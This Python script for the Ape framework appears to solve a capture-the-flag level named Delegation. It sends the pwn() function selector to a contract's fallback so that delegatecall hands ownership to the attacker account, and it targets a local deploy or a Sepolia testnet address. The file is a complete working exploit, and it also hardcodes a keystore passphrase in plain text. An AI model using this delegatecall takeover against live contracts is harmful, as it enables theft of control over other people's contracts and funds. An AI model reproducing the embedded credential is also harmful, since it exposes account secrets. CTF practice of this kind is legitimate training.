#!/usr/bin/python3
from ape import Contract, accounts, convert, networks, project
from scripts.deploy import deploy
from scripts.helper_functions import get_account

# * sepolia: 0x8170163648dAE4D414104aa0FA644a2D2DbC29a7

web3 = networks.provider._web3


def attack():
    if networks.active_provider.network.name == "local":
        delegate, delegation = deploy()
        _, attacker = get_account()
    else:
        delegation = project.Delegation("0x8170163648dAE4D414104aa0FA644a2D2DbC29a7")
        # delegation = project.Delegation("0x8170163648dAE4D414104aa0FA644a2D2DbC29a7")
        attacker = accounts.load("ctf")
        attacker.set_autosign(True, passphrase="chaplesslife")

    # print(delegation.address)

    data = web3.keccak(text="pwn()")
    # print(data)

    # txn = networks.ecosystem.create_transaction(receiver=delegation, value="1 wei", data=data)
    # txn = delegation.as_transaction(sender=attacker, data=data)
    # attacker.call(txn)
    delegation(sender=attacker, data=data, gas=1000000)

    print(delegation.owner())

    assert delegation.owner() == attacker.address, "!owner"


def main():
    attack()


if __name__ == "__main__":
    main()
